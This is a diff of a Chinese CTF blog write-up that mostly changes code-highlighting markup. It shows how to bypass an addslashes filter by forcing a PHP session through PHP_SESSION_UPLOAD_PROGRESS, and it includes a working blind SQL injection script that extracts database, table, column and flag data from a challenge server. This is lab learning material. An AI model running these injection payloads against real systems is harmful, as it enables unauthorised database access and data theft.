@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      472 字
+      393 字
     </span>
   
 
@@ -210,7 +210,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      6
        分钟
     </span>
   
@@ -258,48 +258,48 @@
 <p>但<code>index.php</code>里有过滤<br><img src="https://s3.bmp.ovh/imgs/2021/09/3ebd4db23b9bee97.png" srcset="/img/loading.gif">     </p>
 <p><code>addslashes</code>函数会转义字符<br>有个<code>session_start()</code>函数<br>看WP说可以伪造<code>session</code>直接访问<code>login.php</code>从而绕过<code>index.php</code>中的过滤</p>
 <p><strong>在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()</strong>     </p>
-<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 
-url = <span class="hljs-string">&quot;http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php&quot;</span>
+url <span class="token operator">=</span> <span class="token string">"http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php"</span>
 
-files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;
-a = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,
-                  cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;test1&quot;</span>&#125;, params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>&#125;,
-                  proxies=&#123;<span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)
-print(a.text)</code></pre>
+files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token string">"123456789"</span><span class="token punctuation">&#125;</span>
+a <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span> <span class="token string">"123456789"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+                  cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"test1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+                  proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'http'</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1:8080"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>
 
 
 <p>然后在Burp中改<code>username=1&#39;%22%20or%20sleep(4)%23</code>成功延时    </p>
-<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">import</span> time
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
 
-files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;1234567&#x27;</span>&#125;
-url=<span class="hljs-string">&#x27;http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php&#x27;</span>
+files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'1234567'</span><span class="token punctuation">&#125;</span>
+url<span class="token operator">=</span><span class="token string">'http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php'</span>
 
-flag=<span class="hljs-string">&#x27;&#x27;</span>
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
-    low=<span class="hljs-number">32</span>
-    high=<span class="hljs-number">128</span>
-    mid=(low+high)//<span class="hljs-number">2</span>
-    <span class="hljs-keyword">while</span>(low&lt;high):
-        time.sleep(<span class="hljs-number">0.6</span>)
-        payload=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
-        payload_table=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ptbctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
-        payload_column=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag_tbl&#x27;),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
-        payload_data=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(secret) from ptbctf.flag_tbl),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
-        a=requests.post(url,files=files,
-                    data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;123456&#x27;</span>&#125;,
-                    cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:<span class="hljs-string">&#x27;test1&#x27;</span>&#125;,
-                    params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123123&#x27;</span>&#125;)
-        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span> <span class="hljs-keyword">in</span> a.text:
-            low=mid+<span class="hljs-number">1</span>
-        <span class="hljs-keyword">else</span>:
-            high=mid
-        mid=(low+high)//<span class="hljs-number">2</span>
-    <span class="hljs-keyword">if</span>(mid==<span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid==<span class="hljs-number">128</span>):
-        <span class="hljs-keyword">break</span>
-    flag+=<span class="hljs-built_in">chr</span>(mid)
-    print(flag)</code></pre>
+flag<span class="token operator">=</span><span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    low<span class="token operator">=</span><span class="token number">32</span>
+    high<span class="token operator">=</span><span class="token number">128</span>
+    mid<span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
+    <span class="token keyword">while</span><span class="token punctuation">(</span>low<span class="token operator">&lt;</span>high<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.6</span><span class="token punctuation">)</span>
+        payload<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr(database(),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
+        payload_table<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ptbctf'),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
+        payload_column<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag_tbl'),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
+        payload_data<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr((select group_concat(secret) from ptbctf.flag_tbl),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
+        a<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">,</span>
+                    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'123456'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+                    cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span><span class="token string">'test1'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+                    params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'123123'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'&lt;meta http-equiv="refresh" content="0; url=?p=home" />'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            low<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            high<span class="token operator">=</span>mid
+        mid<span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">==</span><span class="token number">32</span> <span class="token keyword">or</span> mid<span class="token operator">==</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>
 
             </div>
             <hr>
